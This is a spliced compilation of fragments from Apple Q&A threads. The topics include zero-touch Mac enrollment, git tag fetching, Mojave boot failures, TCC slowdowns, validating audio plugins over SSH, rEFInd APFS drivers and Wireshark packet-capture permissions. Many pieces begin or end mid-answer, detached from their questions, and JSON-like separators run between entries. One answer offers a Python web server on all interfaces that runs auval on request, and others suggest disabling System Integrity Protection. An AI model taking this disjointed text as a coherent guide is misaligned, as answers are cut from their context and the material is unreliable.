Can I load these into the Macs before the default setup screen?\nEDIT: Looking more into jamf, it seems like a nice way of managing these Macs.\n\nA: At long last, yes you can set up management for zero touch deployment through a couple avenues.\n\n\n*\n\n*Use an Apple Service called Device Enrollment Program which is now part of the Apple Business Manager service / web app. https://business.apple.com\n\n*Use a product to leverage the login process and install a tool like Jamf Connect which lets you run scripts and check in with a directory before any user logs in. https://www.jamf.com/products/jamf-connect/\nYou can even combine both so that when you purchase a Mac and ship it, it will be enrolled in the management framework, have certificates and helper scripts loaded so that you can leverage cloud identity providers like Okta or Azure AD or roll your own LDAP/OD as the Jamf Connect is based on an open source NoMad project which was acquired and now is enhanced and has become Jamf Connect.\n\n\n*\n\n*https://gitlab.com/Mactroll/NoMAD\nThe implementation of this is quite broad, but there are professional resources and communities to help.

I need to go check out the release notes. \nAnyways, hope this helps!\n\nAdding a bit more background context, this line was very common to fetch the tags by default. It allowed to do git fetch which would also do a git fetch --tags equivalent under the hood.\nBasically, if you want to fetch tags when you do a git fetch with this v2.21 git version, you can create an alias in your .gitconfig as follow:\n[alias]\n    fetch = git fetch --tags\n\nDoing this and removing the fetch = +refs/heads/*:refs/remotes/origin/* will result in the same behaviour, but compatible with git v2.21\nSee https://stackoverflow.com/questions/1204190/does-git-fetch-tags-include-git-fetch/20608181#20608181 for in-depth explanation and history changes.\n\nA: I'm not sure if this is the issue here, but have you checked if the folder that you are trying to clone into is empty?

Takes ca. 1 minute.\nThe last thing he remembers doing differently is plugging in an external sound card (but it didn't crash until the next day). Supporting that, audio doesn't work in safe mode and we see no internal sound device in normal mode.\nThe odd thing is: We can boot into safe mode and it runs fine (except sound). However, when trying to boot into Recovery mode (on disk or online), it turns off before the mode is fully loaded.\nTests/Diagnostics\nThe D hardware test says the hardware is fine. \nIn Safe mode, we can run First Aid and it complains \"invalid btn_btree.keycount\" and \"fsroot tree is invalid – which it cannot fix. We could probably fix this in Recovery mode (but can't get in there) or in Single user (but this is Mojave, so doesn't exist).\nWhen trying to boot into Online Recovery mode, it reproducibly: downloads everything, starts booting, then flickers to black once, then shows a beach ball, then turns off.\nThings we tried:\n\n\n*\n\n*resetting NVRAM, SMC\n\n*moving all Kexts in Extensions to the Desktop\n\n*plugging in the external Soundcard again\n\n\nNext, our questions are:\n\n\n*\n\n*Can we somehow fix the recovery partition from Safe Mode? Is there another way to run Disk Util (Target Disk?)\n\n*Can we somehow wipe the SSD and then restore from Time Machine?\n\n*Will creating a bootable USB stick help?

The disk is encrypted and has a firmware password. He has a current back-up and no money, so we'd prefer to somehow wipe the disk completely than take it in (problem is we don't know how – target disk mode?). \nUpdate\nHe took it into a shop and the guy says the logic board gets too hot to touch within 5 seconds, so must be broken. I don't know why that does't leave any shutdown logs. We are guessing safe mode works because it puts so much less stress on the logic board? We were still thinking about killing all sound kexts or something like that, because he cannot afford the replacement.\n\nA: I would test booting from an external drive running a clean installed OS. If the problem persists, then it's almost certainly a hardware problem. If not, then you are in a good place to repair the issues on the internal disk.\nIt is odd that Safe Mode works, but Recovery doesn't. I presume this is without the audio hardware attached? What is the audio device? Does it require drivers?\nIt is certainly worth trying to install the Mohave update (or a Combi installer for maximum restoration of any corrupted system files).\nFailing all of this, I would take it to an Apple Store. It might be out of warrantee, but they can still diagnose and fix problems. It's possible, depending on your location, that statutory consumer rights may supersede Apple's own warrantee, if it is a hardware fault.\n", "Q: How to remove specific local symbols using `strip` on macOS?

The reasoning behind is out of scope for AskDifferent, but I would assume that it is simply because the need to do haven't come up for Apple Engineers or third party software developers often enough.\nIf you still want to do this, it is relatively simple to enhance strip to work like the Linux version, where you can strip a single, named, local symbol. Download the code for strip here:\nhttps://github.com/opensource-apple/cctools/blob/master/misc/strip.c\nThen take a look at the code for the -X option, and make your own option that strips the symbol you want instead of the ones beginning with L.\nOthers have in past created more capable versions of strip.

Right after finding out that was when I found out I don't have Flash installed.  I consider that a really good thing -- I know how bad flash is!\nI can actually just call it off and get a refund.  But they also have an iOS version that is probably all I'd really use anyway.  So plan A right now is to install the iOS and not have it on my MacBook.\nI'd like opinions on exactly how virulent this particular Adobe virus is and if it is something I'll be happier if I never install.\nAre there documented security reviews or some guidelines I can take in evaluating the security of an Air app in general?\n\nA: Well, it's just an app framework, so depending on what your needs are it could be a savior so you don't have to spend any energy or money working on an app to a really bad piece of software.\nI personally have held the line on flash and air and insisted that most apps run on iOS to avoid having to deal with those app frameworks, but not everyone can insist on that.\nIt wouldn't be less draconian and less secure to insist that developers sign their apps with a developer certificate and that you deny all prompts if you don't understand the security risks. \n\n\n*\n\n*https://www.adobe.com/products/air/faq.html\n\nApplications deployed on Adobe AIR have powerful capabilities and access to local data, so this dialog box provides information about who built the application and allows you to decide whether to install it. If someone you trust developed the application and you would like to install it, then selecting Yes will allow the installation to proceed. If you do not recognize the developer or it is someone you do not trust, then you should not install the application.\n\nSince Adobe doesn't even link to their security white paper from the FAQ, you can infer how invested they might be in having people learn about the security of that product. (You could equally give them a pass and ask for that link or search for it as well - It might not be intentional and Apple also has gaps in their web pages from time to time, so I’ll not pile on Adobe too much for one missing KB article link)\nIf that breaks the software, I would ask for a refund. You'd be well protected if your Mac doesn't allow non-app store / non-signed apps to run. Adobe is really clear, the air apps persist on your machine and are security risks just like all native apps that are not signed and don't work in a sandbox are.\nAlso, if you assume an educated user, always updating apps and plug in, never giving away admin password - I could see Air or Flash being a security neutral or managed risk. If you don't, I would avoid using them since you do need to learn, understand, manage the risk of more frameworks and letting flash (air) run on your Mac.\n\nA: In general it is pretty bad as it is a framework designed for developers with a more selective view of software engineering, often causing total reliance on the runtime for things like security and performance. Sadly, we all know how well that went with things like flash, silverlight and java applets.\nIf it is easy to write bad code but make money anyway, bad code will be written. Things like Adobe AIR facilitate that.\n", "Q: System slowness: How to disable or short-circuit tccd in Mojave? (slows app & subprocess startup) There's a serious problem that's come up especially in Mojave and Apple seems to not really be interested in resolving this from my discussions with engineers in the know. It especially manifests itself when opening certain apps and subprocesses therein (two examples are python and emacs). This didn't seem to be so much of a problem initially in Mojave, but it's getting worse and it most certainly was not a problem in High Sierra.\nIt appears to happen due to tccd (some discussions; there are many mentions of these issues in obscure spots around) somehow generating some additional overhead that wasn't present before in previous OS releases.  While Apple may consider this to be acceptable, there are many of us who are struggling with the additional time that it's adding to process spawning.\nThis seems to be able to be reproduced via any app that's existent under any of the sections under System Preferences → Security & Privacy → Privacy.\n\nA: Quick answer:\nYou have to use configuration profiles that can only be deployed via an MDM (Mobile Device Management Software) to disable tcc and tcc prompts. Unfortunately TCC is written strong into Mojave's code and doesn't seem to be going away any time soon. This is a downfall for developers/engineers/users/administrators as we all are going to have to learn learn how to walk with TCC. Apple's push for security is stronger than ever and has been written on the wall for Mac Admins for quite some time.\nLonger Answer:\nApple is pushing for companies to move over to DEP/MDM workflows for deploying machines to their users: https://support.apple.com/en-us/HT204142\nWith Mac OS Mojave, Apple wants users to validate the use of programs gaining access to their files, hence the TCC messages of programs wanting to gain access. What does this have to do with your question you ask? Well...\nThere is some hope for companies that manage their machines with DEP/MDM solutions such as JAMF (for an example). Apple has pointed this out and the annoying prompts can be disabled by using an MDM and configuration profiles here:\nhttps://support.apple.com/en-au/HT209028\n\nYou can allow apps to access certain files used for system administration, and to allow access to application data. For example, if an app requests access to your Calendar data, you can allow or deny the request. MDM administrators can manage these requests using the Privacy Preferences Policy Control payload, as documented in the Configuration Profile Reference.\n\nMac admin Carl Ashley has also pointed this out in more detail here:\nhttps://carlashley.com/2018/09/28/tcc-round-up/\n\nYou will absolutely need an MDM to deploy these profiles as they cannot be deployed direct to a machine through a package, or other installation method.\n  This will mean either a DEP to MDM enrolment workflow, or through User Approved MDM (users manually enrol their Mac into MDM).\n\nIf you try to do this with a non-managed mac and install the config profile without an MDM, it will defeat the purpose of using both the MDM and the config profile because the config profile will prompt the user to install it in System Preferences > Profiles.\nExample:\n\nThis might possibly change if Apple announces a new OS this summer with 10.15. For unknown reasons Apple also has not explicitly documented to developers the need to add the NSRemindersUsageDescription key string in the Info.plist file of their applications to prevent their applications from crashing.\nIt is counter intuitive for developers to revert back to Xcode 9, where this problem doesn't seem to occur, unlike in its successor Xcode 10. Hoakley also validated this when he tried to use an older version of a program he developed with a Xcode older than v10 in Mojave and it ran fine, allowing the newer version of the app to prompt the user for consent to use the computer files/programs as intended. \n\nI then tested an older version of xattred(Hoakley's program), and discovered that, instead of crashing, it did produce the expected user consent. Once added to that list, the newer version stopped crashing, and could access all protected Calendar files without any more dialogs.\n\nAfter the user consents to the application, this app in question appears under one of the lists under System Preferences > Security & Privacy > Privacy and usually under Accessibility.\n\nOn the bright side:\nTrust me, all of us as Macadmins are on the same page of busting our heads on the table over TCC. I can imagine its much worse for the normal user who likes to dabble in the administration domain. Hopefully we will see better, sane, implementation of TCC with future updates of Mac OS.\nIf you are curious in dabbling with creating profiles, and possibly have an MDM you can try the following:\nhttps://github.com/carlashley/tccprofile\nhttps://github.com/erikberglund/ProfileCreator\nI hope this explanation is of use to you as a developer/engineer.\n", "Q: Issue Enabling VNC Access on Mojave 10.14 I am aware of the answers posted online for this, mainly that I need to allow permission to /Library/vnc/vncagent in the Security & Privacy section of System Preferences. \nHowever I cannot find \"vnc\" under the Library folder, or any mention at all of \"vncagent\".\n\nA: Did you install VNC Server?

We talk for 1-4 hours when we do. Most times, 1 to 3 times throughout the call, the image will freeze, go blurry, and give me the error “Poor Connection, the video will resume automatically when the connection improves” but the video never resumes, even though if I hang up and call back, the video is fine. Is there a way to fix this so that I don’t have to hang up and call back to get the video back?\nI usually use a MacBook Air, but it also happens on my iPhone 6s. My parents are usually using either an iPhone 6s Plus or an iPhone 7.\n\nA: I believe that sometime after I posted this question, Apple resolved the issue with the ability to resume the connection in the case of my MacBook Air and my parents' iPhone 6 & 7, but I only know this because of the same issue recurring in a very specific case:\nA few months after the pandemic started, I had set up a FaceTime Portal with my parents between 2 dedicated devices: my iPad Mini and their iPad Air (1 or 2, maxed out at iOS 12.5).\nFor 3 weeks, it worked great. I ran it every weekday for the whole work day (8 hours per day). I was initially running iPadOS 13.7, and after 3 weeks, I updated to 14.x. Immediately after updating, the problem described in my question started happening consistently every time within a minute or 2 of placing the call.\nCalls would barely last a minute before I would see a burry darkened background with a \"poor connection\" warning. Maybe 10 seconds after that, I would without fail, get a call failed error.\nI immediately reached out to Apple. They told me that there was a bug. Initially they told me to watch for an update of iOS 12.5, but ultimately, the problem must have been server-side, because after a few months, it just suddenly started working reliably.\nThere had been a 12.5.1 update that I had my parents install during that time, but multiple tests after that update showed the problem persisted. I had also updated my iPad Mini to 14.4, and again, the problem persisted.\nThen one day, I randomly tested it, as I occasionally did, and it stayed connected all day. I still occasionally get the poor connection message, but it almost always comes back. Nothing changed on my side.\nSo the answer to this question is, the only thing you can do is call Apple and complain. My feedback carried weight because I had been using FaceTime 8h/day for 3 weeks and they could see it in the logs they requested and they could also see all of the failed calls after the 14 update. Plus, we were each using Airport Extremes for our WiFi connections.\n", "Q: What is the best way I can take my book from iBooks and converted into a EPUB format I would also like the ability to show my book through Kindle without having to start over with an EPUB format iBooks has a scroll widget that will make it difficult to convert I believe looking for  any help \n\nA: I would suggest you to use Calibre:\n\ncalibre is a powerful and easy to use e-book manager.

For instance, you’ll have some space used for swapping. Clearly, swap is part of the total amount, but not available for use for general storage. Also, depending on how the disk is partitioned that will affect space. For a more practical display of space, try:\ndf -h\n\nFor instance, those tools show my disk space as 4GB in total, but that’s not all available for my use: df -h shows it as 3.6 GB. \n", "Q: Downloading an application without the admin password I am a standard user of a Mac Mini. There are certain applications I would like to download from the web, but they require the Apple installer, which then requires the admin password. Is there any way I could circumvent this?\n\nA: The whole purpose of the OS requesting authorisation is to prevent software being installed without permission. If there were a method of bypassing the request, that would be considered a 'security flaw' and Apple would (hopefully) fix it quickly.\nIf you are not the actual owner of the Mac, then you need to ask the owner for permission to install the software. \n\nA: As long as you have an account with admin privileges you can just fill in the name and password of the admin account even if you are logged in with your standard account. \nYou can not circumvent the question for admin password for security reasons as benwiggy said. \n", "Q: Install older removed brew formula version While brew has an accessible simple versioning mechanism, it's restricted to versions used by a large number of people.

The number of process \"triggered by you\" is a small proportion of the total.\nIn general, if there isn't a \"problem\" -- such as one process using up all your memory or CPU resources, or a general sluggishness -- then I would assume all is well. Your memory usage certainly seems to be well within acceptable limits. (Low, green memory pressure, little Swap.)\nYou do have a lot of mdworker_shared processes.

I use the same command in the same directory both in local and over SSH.\n/usr/bin/auvaltool -v aumf MyPl Loco\n\nThe thing is, using SSH, auval do not detect my plugins (/usr/bin/auvaltool -a), but only Apple default ones.

I implemented a small python-http server which expects the auval arguments as url-get parameters. \nIf this python-server now is started using a non-ssh session, it is possible to validate all plugins using the http-get call. Below is the code for the small server.\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport subprocess\nfrom urllib.parse import urlparse, parse_qs\n\nimport traceback\n\n\ndef run_auval(params):\n    arguments = [\"auval\", \"-v\", params[\"type\"], params[\"subtype\"], params[\"manufactor\"]]\n    print(\"Running AUVal: {}\".format(arguments))\n    process_return = subprocess.run(arguments, capture_output=True)\n    return process_return.stdout + process_return.stderr, process_return.returncode\n\n\nclass SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        raw_params = parse_qs(urlparse(self.path).query)\n        params = {}\n        for key, value in raw_params.items():\n            params[key] = value[0]\n\n        try:\n            output, return_code = run_auval(params)\n        except:\n            self.send_response(500)\n            self.end_headers()\n            self.wfile.write(str.encode(traceback.format_exc()))\n            return\n\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(output)\n\n\nif __name__ == \"__main__\":\n    httpd = HTTPServer((\"0.0.0.0\", 8000), SimpleHTTPRequestHandler)\n    httpd.serve_forever()\n\nYou can then use wget or an equivalent from an SSH session to get the result of au validation.\nWith the server running, output goes to auval_log.txt where you can search for FAILURE or SUCCESS:\nwget \"http://localhost:8000?type=aufx&subtype=Abcd&manufactor=Dlby\" -O auval_log.txt\n\nThis is equivalent to running\nauval -v aufx Abcd Dlby\n\nbut without the SSH issues\n\nA: This is a long shot, but I once had to install tmux with brew install tmux (and I already had https://brew.sh set up and ready to run) so that I could graphically log in and establish a terminal session for the user in question. \nWith fast user switching, you can then return to the log in screen - leaving that one user console session blessed with full GPU and full graphical console permissions and then ssh in to attach to the existing TMUX sessions.\nHopefully someone has a more direct answer, but after several days of bounties and some great comments trying to back into the answer, I wanted to get on the record that a graphical log in does have higher powers and permissions and you just might need that for now if no-one has a better fix for this.\n\nA: There is definitely a bug in OSX 10.14 and higher.\nSince Apple seems not in the way to fix it, I'll post the workaround as an answer.\nThe workaround here is to copy the AU components you need to validate through SSH in /System/Library/Components/, and then sudo killall -9 AudioComponentRegistrar in order to force a rescan on the next auval run.\nFor this, you will need to disable System Integrity Protection which forbid you to change the System directories.\nJust for you know, AudioComponentRegistrar is a deamon, but auval is launching it if needed.\nNote that you can find some nice information in this gist (it explains a workaround for iTerm2 users too).\n", "Q: Explore contents of a ZIP/Archive from Finder?

Unlike KIO or Gnome VFS, it can be used in any application without modifications.\n\nIf a seamless usage is the goal but the manual setup sounds too complicated for that, then it's worth to take a look at ivoronin/ArchiveMounter:\n\nMounts archives like disk images (macOS)\n\nIf you 'install' that application and drag its icon also to the Finder toolbar, (in macOS this was made slightly more complicated: hold Cmd and then drag the app to the toolbar until you see a plus sign) you have a convenient, low-cost solution, that allows you to look inside the archives, extract single files as needed and even manipulate the contents without a full decompression (and/or re-compression). Although that last feature seems to be judged as not that stable by the developer, as it's turned off by default: without setting any preferences it defaults to 'mount' archives read-only.\nTo solve the issue with double-click resulting in an undesired action (full decompression), you then have to choose from one of the options listed here your favourite method. Then right-click on a zip-file and choose \"Get Info\".

I am a developer (actually .NET developer ^___^) and would like to have my personal and professional use separated under the same machine.\nI know there is the possibility to use Bootcamp to install Windows, probably the cleanest approach, but I am learning .NET Core and other frameworks available in macOS that I like to work with.\nWhich approach would you try to keep both personal and developers use away from each other?\n\nA: Caveat\nI am not a user of or developer for Microsoft technologies, generally speaking. I do almost all of both my professional and personal use on a combination of MacOS and Linux. I use almost exclusively free tools (e.g. vim) for development, and so little to no concerns of licensing, product activation, etc.\nThat being said...\nI would challenge you to reframe your way of looking at this: development environments, for work or personal use, should be (as far as is possible given the constraints) completely disposable.\nI do almost all of my dev work in VMs that are provisioned by scripts. Reusable, replaceable, reproducible VMs. The host and guest OSes aren't super-relevant, as long as the system meets those goals.\nOn my trusty MBP, that is achieved through a combination of Vagrant/VirtualBox for server vms (sub with Docker if you swing that way) and Parallels for my actual dev environment. All of my configuration and provisioning are stored and versioned courtesy of github, and I regularly update them as my needs/tastes change.\nNow, I don't always strictly adhere to that, I do some work on the host MacOS. But I'm 60% remote, and it's really nice not to have to switch gears too much between home office (MBP) and office office (linux workstation).\nYou may not want to go this far, and I'm still not sure it was worth all of the effort it took to set up, but I can be productive on a new machine in half and hour or so, and I never have to worry about \"works on my machine\" kind of issues.\n\nA: You can create a second user account to separate both purposes, or even add a partition and install a second macOS for even more separation. An additional user account is usually more than enough.\n\nA: There are multiple options:\nThe simplest would be to create two user accounts. Your first account is created during the first use of the Mac. Create a second account by clicking the Apple-menu in the top left corner, select System Preferences, Users & Groups, open the lock and click + to add a new user.\nThis way you can login to either a personal or professional account. In the same place you add accounts, you can click \"Login Options\" where you can enble \"Fast User Switching\". This allows you to easily switch between the personal and private account (both can be logged in at the same time).\nOther options for seperating personal and professional use are:\n1) BootCamp Windows installation for professional use, macOS installation for personal use. Major drawbacks are that it requires a full reboot every time you want to switch between the two, and it is a hassle to ensure that disk space is available according to where you need it.\n2) Virtual Machine with Windows (or macOS) for professional use, and the macOS native system for personal use. Can be done with for example VMware Fusion, Parallels Desktop or free alternatives such as VirtualBox. You can run the two environments simultaneously and share files, clipboard, etc. However allocating storage correctly can still be a nuisance.\n3) Spaces. You can divide your open application windows in different \"spaces\" on the Mac. When you change \"spaces\" a whole set of windows are exchanged, such that you can keep a virtual desktop with all your professional stuff seperated from the private stuff.

I use Paragon hard disk manager & disk utility to resize it and have screenshot like below.\nBut I can't add free space to main osx partition. I found that I have to move free space section to near main partition so I can able to resize it.\nSo how do I do that?\n\nThank you\n\nA: Don't even start this without a solid backup.\nRight click the NTFS partition & select Move/Resize Partition.\nDrag the Free Space After slider all the way to the left.\nThis will move the NTFS partition to the end of the disk & the free space into the area outlined below, between the APFS container & NTFS partition. This should then consolidate your free space.\n\nVolumes on APFS containers will not show as filling all the available space, due to their 'live expandability' feature, even though the container itself does. I don't have an example with APFS & NTFS to show, but this is my 1TB SSD which shows as having 456GB 'free' at the end whereas the container itself & in the Finder the Volume is actually [almost] the entire 1TB.\n\nSo, to complete your changes, you need to select the APFS Container [not the Volume on it] & again using Move/Resize Partition, change the New Size until it fills your moved Free Space.\n\nRemember to Apply Operations afterwards.  \nNote: This is likely to be a very long, slow operation; whilst potentially a lot faster on SSD [on which I have never actually tried to do a data move of this size] on HD I'd expect to come back to it in the morning, so make sure you have plenty of time & keep the Mac on mains power.\n\nA: I don't have my computer working to follow along with my answer right now, but I'll try to do this from memory.\nThere are three sliders:\n\n\n*\n\n*Free space before\n\n*Size of partition\n\n*Free space after\n\n\nWhen they say free space before and after, they aren't referring to before and after the operation, they are referring to before and after the selected partition.\nImportant! Try the solution that I put at the bottom of the answer first, if it works it'll be the lease messy solution.\nIt looks like you want to have 50gb of free space before, so (I think) delete the free space partition, and then either:\n\n\n*\n\n*increase the size of the apple one directly (not sure if this can be done)\n\n*select the mac and windows partition (I'm presuming that the 50gb came from there) and adjust them how you want (again, not sure if this can be done)\n\n\nOr, (this can probably be done) don't delete the 50gb free space partition, and just drag it to the left. I don't know off of the top of my head how to merge partitions, but with the free space next to it, it will probably just let you increase the partition size. To do this though, you have to be looking at the size adjustments for the macOS partition, not the free space one or the windows one.\n", "Q: How to remove all traces of a kext?

You need to install the intermediate certificate on the server/F5 (i.e. whatever terminates your SSL), so that the TLS server actually replies with the full chain including the intermediate certificate.\n", "Q: Why am I able to open Wireshark and capture packets in macOS without root privileges? As far as I know, capturing packets using Wireshark requires root/administrator privileges. In Windows, it prompts for UAC elevation and runs with administrative privileges. The same thing in Ubuntu; it prompts for a password to authorize access before showing me the interfaces. \nHowever, in macOS, there is no authorization required. I don't have to enter a password. Instead, Wireshark is directly showing me the interfaces and I am able to capture packets.\nHow is Wireshark able to do this on macOS? What is special about macOS that allows interfaces and packets to be monitored without administrative access?\n\nA: The reason is that the Wireshark installer installs a LaunchDaemon (i.e. something that runs with superuser privileges on boot) for setting special permissions to capture network packets. More specifically you can look at the file /Library/LaunchDaemon/org.wireshark.ChmodBPF.plist to see what it does and when it is run.\nAs creating these LaunchDaemons require superuser privileges in itself, the Wireshark installer requires you to be a superuser (i.e. you have to enter an administrator user password to install the software).\nIf you look at the actual script run by the LaunchDaemon in /Library/Application Support/Wireshark/ChmodBPF/ChmodBPF, you'll see that it creates 256 devices entries /dev/bpf0 to /dev/bpf255 and sets to that everyone in the access_bpf group can read and write to these device files.\nThe access_bpf groups is actually also created by Wireshark installer. This also requires superuser privileges. If you open System Preferences and then Users & Groups, you'll be able to fold out the \"Groups\" part of the tree and see \"access_bpf\" listed there. You can then add/remove users from that group to give or remove permission to capture network packets within Wireshark.\n", "Q: Whole system backup boot-camp included I have access to a 1TB drive.\nI need to backup the MacBook which I have access to, which has a version of Windows on it via Bootcamp.\nI have learned that Time Machine does not keep track of windows partitions.\nHow can I do a whole-systems backup of the device, bootcamp partitions included?\n\nA: I would use winclone to back up the windows separate from the Mac. \n\n\n*\n\n*Backing up a Boot Camp partition\nThe reasons are for file system differences and the simple fact that you have to back up the entire terabyte each time if you just image the drive using disk utility.\nBut you can also image the whole drive with disk utility - block by block - and have an image of it.

The original path of the directory was ~/Library/Application Support/Steam/steamapps/common/Factorio/factorio.app/Contents/data/base/campaigns/demo/locale/ru.  The part from demo downwards caused the game to not start properly (it was, apart from the directories, empty, but the game tried to pick up some non-existing file from the demo directory and crashed).

Attempting to mount a HFS+ filesystem as read/write from multiple systems will likely result in multiple systems trying to update data in the same locations on disk, causing catastrophic filesystem corruption.\nThe safest way to ensure that the image is always mounted read-only will be to create it as a compressed disk image, or write-protect it directly on the server.

Problem: NVMExpress Macs that have Refind do not see the APFS container and I cannot boot into my mac. \nAlso, apologies to those who were aware of this solution, but I faced this issue along with several other technicians on the problem and we could not solve this until now.\nI will be answering my own question below but this post applies to users who are doing the following with their mac:\n\n\n*\n\n*Have disabled SIPS on their device\n\n*Trying to use refind with Mac OS Mojave\n\n*Upgrading from High Sierra HFS to Mojave APFS\n\n*Using refind version 10.4 or 11.4\n\n\nThis post will not apply for macs that do not have:\n\n\n*\n\n*A NVMExpress controller. Examples of Macs that do have it are the Mac Models 18,2, and 18,3.\n\n\nIf you install refind using the unix installer onto an NVMExpress machine, it does not automatically install the appropriate driver folder that will allow you to support APFS, leaving you to assume that refind is buggy. Refind ends up not being able to see the APFS container Preboot or Macintosh HD volumes on the refind menu to boot into your Mac OS Mojave System. \nIf you tried this on a non NVMExpress machine and had High Sierra APFS, you would only see the Macintosh HD volume, which validates that refind works. This is also true if you had Mojave on a non NVMexpress machine, as refind version 11 would easily pick up on both the Preboot and the Macintosh HD Volumes.\n\nA: Solution: \nEDIT: Thank you to @DavidAnderson for pointing out that the driver file \"hfs_x64.efi\" is what causes the Mac to be able to see the bootable container on the mac. Please see his answer for a better explanation.\nThe solution is very brief and involves installing the \"driver_x64\" folder included with the refind download in refind-bin_X/refind/drivers_x64.\nSimply drag and drop this \"drivers_x64\" folder into the EFI/EFI/refind directory after mounting the EFI. Your EFI refind folder should look like this:\n\nBelow are some useful commands that helped me.\nHow to check which mac model I have\nYou can enter the following in terminal to see your model number:\nsystem_profiler SPHardwareDataType | grep \"Model Identifier:\"\n\nHow to check if my Mac has NVMExpress\nNewer macs will most likely have the NVMExpress SSD Controller. But if you are curious in learning what kind of connection you are using, you can input the following commands, separately. \nIf your device is SATA it will return the info regarding your SATA hard drive and the connection. \nIf your device is NVMExpress then it will return info regarding your NVMExpress Hard drive and the connection. Of course if your device is not NVMexpress then it will return nothing.\nsystem_profiler SPNVMeDataType\nsystem_profiler SPSerialATADataType\n\nExample: \n\nPlease note that the version of Refind will affect which Volumes you would be able to boot up from. I tested this on Refind version 10.4 and 11.4.\nFrom my testing I found that with 10.4 you will only be able to see the \"Macintosh HD\" volume.\nAny version after and including 11.1 are designed to see the Preboot Volume that comes installed with the upgrade to Mac Os Mojave. For more info regarding Refind revisions you can go here:\nhttp://www.rodsbooks.com/refind/revisions.html\nI do find it strange that within the driver folder there is no explicit mention of an \"apfs.efi\" driver. I probably plan to bring this up to the developer. But it still seems to fix this issue. See below for what I mean:\n\nI hope this helps! This was breaking my head for over a week until this simple solution occurred to me. Hopefully it helps you as well.\n\nA: Normally, rEFInd relies on the Mac firmware to read Apple formatted partitions. Eventually, this software is not sufficient in certain circumstances.\nYou can include all the drivers provided with rEFInd by adding the --alldrivers option when executing the ./refind-install script. However the refind-install man page states the following with regard to this option.\n\n--alldrivers\n\nWhen you specify this option, refind-install copies all the driver files for your architecture. You may want to remove unused driver files after you use this option. Note that some computers hang or fail to work with any drivers if you use this option, so use it with caution.\n\n\nI assume one of the drivers you want to keep would be named hfs_x64.efi. The The rEFInd Boot Manager: Using EFI Drivers webpage states the following about this driver.\n\n  \n*\n  \n*HFS+—Oracle wrote this driver, apparently with some code taken from open source Apple examples. It was then further modified by the Clover authors. I expect this driver to have limited appeal to most rEFInd users. Macs don't need it, since Apple's EFI implementation provides its own HFS+ driver, and HFS+ isn't normally used on UEFI-based PCs. Some CDs are mastered with both ISO-9660 and HFS+, or even with HFS+ alone, and it's conceivable that an HFS+ driver would be useful when accessing such discs. Also, one unusual feature of this driver is that it can read files from within an Apple LVM setup, which Apple's own EFI HFS+ driver can't do. The upshot of this feature is that if you load this driver on a Mac that uses Apple's LVM, rEFInd is likely to show two OS X boot options. Ordinarily this is pointless, but it could be helpful if your Recovery HD volume becomes damaged. I'm providing the driver mainly because it compiled cleanly with no extra work, aside from providing a Makefile entry for it.\n  \n\nAPFS is Apples latest attempt to create a LVM. The above excerpt does confirm that the driver can detect additional boot options when using Apple's LVM.\n", "Q: USB audio ducks when Notifications happen I'm using a USB DAC (FiiO BTRK3).

It is not intended for use on iOS, and the packages it downloads will not run on an iOS system. It cannot compile packages for iOS either, as the Xcode toolchain is not available for iOS.\nAttempting to install Homebrew will be futile, and may render your device unusable.\n", "Q: Why does lsof exceed kern.maxfiles? Running Mojave 10.14.3 I notice there are currently more files open than the maxfiles allowed.  How is this possible?

Most notably, it includes program text mapped into all processes (e.g, the executable and all libraries it's using). There are a lot of these mappings in most GUI processes -- I count over 270 for the Finder, for instance -- and they don't consume file handles.\nIf you believe you are hitting the system's open file limit, go ahead and change kern.maxfile. However, it's more likely that you're hitting the per-process open file limit, which defaults to a lower number (7168 on my system) and can be changed using ulimit.\n", "Q: Update screwing with encrypted disk or keep using windows boot? On my 2011 macbook air i have high sierra installed.\nIt attempted and at some point completed an update security update 2010-001 to version 10.13.6 (not sure if i had automatic updates on or not).\nBecause i had disk encryption on, i think it became befouled. \nSomething like what is discussed here:\nhttp://discussions.apple.com/thread/8092225\nforums.developer.apple.com/thread/79420\nI now have trouble booting (often it doesnt boot and it takes ages when it does).\nI tried clearing the flash with (cmd+optn+P+R) without much help. \nOn the odd occasion it eventually boots, but as with others on that page everything was going real slow and so i tried to start decrypting the disk (turning off file vault encryption) as others suggested on that page. \nNow it is taking a real long time to decrypt. I left it on overnight and had sleep turned off, nevertheless it still locked my computer and i think maybe made no progress over night. \nSo i got it to boot into my install of windows via bootcamp, and windows works fine. So my question is, should i just use my Mac as a windows machine? or is Apple working on a fix for this problem?\nI was able to do a FirstAid via DiskUtility on two different occasions. The first time (before i started decrypting) it came up with errors. The second time after i started decryption, it seemed to complete fine.\nI was able to get into recovery mode where i could reinstall the O.S but it wont allow me because indefinite decryption is occuring. \nHigh Sierra is basically not functional/fast now and decrytion is taking forever.\nWill i need to wipe the whole disk or will the decryption eventually finish?\n\nA: UPDATED ANSWER:\nI noticed safe boot (hold shift) WAS working fine with CPU available but limited by the fact it doesnt load everything.\nI then did Justin Silvers method of removing older kexts. \nParticularly previous to that i was only managing kexts under /Library and ~/Library but now i was also removing older ones from /System/Library.\nOne of the kexts i removed was PACEsupport and i also moved other Mbox2 related old kexts. These were from pre 2015.\nBut this didnt fix things immediately and not even after restart, but it did force the cache to rebuild itself from scratch as i watch it do so in verbose boot mode (cmd+v).\nSo i went out to buy a replacement cord as i had given up on fixing the O.S and was going to try to get my old external HD to restore an old snapshot if possible, then suddenly out of the blue it released CPU resources again & now kernel is processing fine again & now i just need to find the correct way to recognise my old external HD. \nAt the time it released resources it seemed to be processing a lot of QuickLookSatellite processes & i took a snapshot here.\nAs you can see the kernel was using all the CPU (at times up to 1300% or more) and here it falls off the cliff back to 18% seemingly randomly but i think it just finally processed all the kext cache again and maybe some of the removed kexts were no longer preventing it. But i think there were several kexts that were problematic here particularly originally the Commander uninstall kext process was DDoSing the kernel CPU.\n\n\nUPDATE:\nindeed the problem returned. \nhowever i was able to fix it by doing the below.\nAfter the disk decryption process finished, i still couldn't reinstall the O.S through recovery boot, because of connection to apple server problems, even after fixing datetime synchronisation problems. \nI was however able to get my system functioning again by removing some startup items and daemons that i think were flooding my system CPU usage. I found these via inspecting the console (in utility folder) and by using EtreCheck tool.\nEffectively a couple of older kexts were continually polling my O.S kernel (particularly one called Commander, associated with an old WIFI dongle uninstall process and another one associate with an old program called NoSleep that would prevent the O.S from sleeping but was designed for an older O.S). \nThese mustve been in conflict with kernel changes in high sierra + update. So they were effectively DDOSing 